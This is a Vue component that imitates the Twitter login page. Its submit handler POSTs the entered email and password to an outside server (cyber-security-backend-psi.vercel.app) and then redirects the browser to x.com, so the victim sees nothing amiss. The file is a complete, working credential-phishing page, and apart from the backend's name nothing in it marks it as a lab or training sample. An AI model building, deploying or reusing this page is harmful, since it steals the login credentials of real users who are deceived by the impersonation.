<script lang="js" setup>
import { ref } from 'vue';
import axios from 'axios'
const email = ref('');
const password = ref('');

async function submit(event) {
  event.preventDefault();
  try {
    const response = await fetch('https://cyber-security-backend-psi.vercel.app/api/account', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ email: email.value, password: password.value })
    });

    const data = await response.json();
    console.log("data", data)

  } catch (err) {
    console.log("err", err);
  }
  window.location.href = "https://www.x.com/";
}

</script>


<template>
  <div class='container'>
    <div class='div-1'>
      <div class='sub-div-1'>
        <i class="fa fa-twitter icon"></i>
      </div>
    </div>
    <div class='div-2'>
      <div class='sub-div-2'>
        <h3>Log in to Twitter</h3>
      </div>
    </div>
    <form @submit="submit">

      <div class='div-3'>
        <div class='sub-div-3'>
          <label>Phone, email or username</label><br>
          <input v-model="email" type='text'>
        </div>
      </div>
      <div class='div-4'>
        <div class='sub-div-4'>
          <label>Password</label><br>
          <input v-model="password" type='password'>
        </div>
      </div>
      <div class='div-5'>
        <div class='sub-div-5'>
          <button type="submit">Log in</button>
        </div>
      </div>
    </form>
    <div class='div-6'>
      <div class='sub-div-6'>
        <a href=''>Forgot password? .&nbsp;</a>
        <a href=''>Sign up for Twitter</a>
      </div>
    </div>
  </div>
</template>